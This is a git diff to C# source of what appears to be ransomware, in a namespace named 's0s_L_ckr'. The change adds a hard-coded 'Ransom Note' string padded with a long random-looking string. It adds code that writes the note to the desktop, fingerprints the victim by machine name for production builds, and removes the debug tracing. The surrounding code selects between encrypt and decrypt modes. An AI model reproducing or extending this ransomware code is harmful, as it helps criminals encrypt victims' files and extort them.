@@ -1,4 +1,5 @@
-﻿using System.Diagnostics;
+﻿using System;
+using System.Diagnostics;
 using System.Threading;
 
 /*************************
@@ -18,16 +19,33 @@ namespace s0s_L_ckr
     {
         static int Main(string[] args)
         {
-            Trace.Listeners.Add(new ConsoleTraceListener());
+            //var recoByt = Convert.FromBase64String("3EstYvSXUTv1MBpAVIzSV4SVzmA47AEAaW8BH90c481lcVM2YPfTzqiCOEWoKgqYcJqNrijoKa5hqfJfE");
+            var recoMess = "Ransom Note: \n \tWhat Happened to my files? \n" +
+                "20qUdZOQZw0iatnMEH4ZzM6ZUYiGVhlwFCEl5CaQeQkuFQ5A5vQeKaIe12gt0kosuiil" +
+                "epi02ch6RMrRhj3CCFmo4knVUUKH0JgnPrjFgRFcQfOxCPVp2pUFzeGPQ8HxsvO2vO7CC7CEhAqFyL2qWreHVVr9" +
+                "Km3yzWIWPJKTLrdS0gxuHuIY4yPqcpp8j5qUYcmfLej88qIIcuowtKXzxwR7EFH8HdhURb6GpZlXJ8kOwOKKk3d4FONdm" +
+                "Ck2UCUjUMrGBXpkZg2q272VMqimyUp38pQDX3fGcd4o8kkz7HtcaeBJY2FhwsHduM" +
+                "XW19QaAwKz6eNJpzqCeulDes4EzFQ1zH4l7Vwumut5wbEaiD6WM0jqnoHczgKzjER" +
+                "sgB4l18olp4zC20kXlQRNCmq8ymn1AwOhibLVF6QoddbhIU9MecY8cjfIZGxfLQHWBaNo" +
+                "Ib9ZqIrDo8X05pQqW9MbT88Zluh0OqLvyj9HevMJSJxQK1qS0TXrPk18xdwPfm2UC0WByaPQJqBolNAmuZjnVQe" +
+                "IGZpUt5ZcLF2hFDdaogFwrE1oOxfYErZYJNs9urUsk8S0fjqbyB3rHYu9YPKIICRR29epBexzt9F" +
+                "hrLbZYa1XL3b2W9wxDFrXMuFPfK3hRKVdKZWIVPvM0QxYUy8EgRQi8pwDDCqwpvf" +
+                "cbhYoy8MRrucNjM9CahKofVAOno4qDjubZViVt4TfJ5yACdHS6cmVrEWlCGuJrlTVGU2ga5HVuL8tpVHrj5qNT4" +
+                "v0TX0NhZBHh34Qvu2yu54NRv31syOhEU97JeuOWhNK4Fn1ZPc7kz0nFuZLI24XS1EHkcPOL" +
+                "pwHjjcow4K0C7xYJcy2ZH5BaluXNljGjz5lteew4Cc4p0cBdkozPkdYHCza0S8KtVgoBI5UNAne5ip9G4NBlDeFveW" +
+                "9BywC3RtPvf07jl7GhrznkimVsAj9Y2M98R0Nrx4sHEHGZhFKCvkWfyH6EPmUGPmpZbul1VDHI" +
+                "4DAUug3mrU4NuZVrH59M2R3fZB1keXKCGIAalLj76B51fuCCd4aZm" +
+                "VqNpE8bHbMRC4Rhjl7FLc8Dra8uOb3QbBYu5hMXoh2NLwhacp4NzVoIXKTqVbnSzNR0GJa4vFUhwE47Xp7eQ2" +
+                "jm0bVU7lLylyd1RdJA2JMgc6Dwh1jJF5CF5sQPODQOw60YzpQE1J2PtRFrrDAZYV4YZaUaAFqZBIW5jF0";
+            var ransomMessage = new RansomMessage(recoMess, "Recovery Instructions Here", 10);
+            ransomMessage.WritMesToDes();
+
 
             string ops = (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E");
             bool encrypt = true;
             //Debug Generation
-#if DEBUG
-            string fingerprint = null;
+            string fingerprint = Environment.MachineName;
             CompIdStrat.StickyFingerPrinter(ref fingerprint);
-            Trace.WriteLine("[+] System FingerPrint: " + fingerprint);
-#endif
 
             // Criptographic Key Manager for Files
             //CriptoKeyMgr.EnsrLocPubKey();
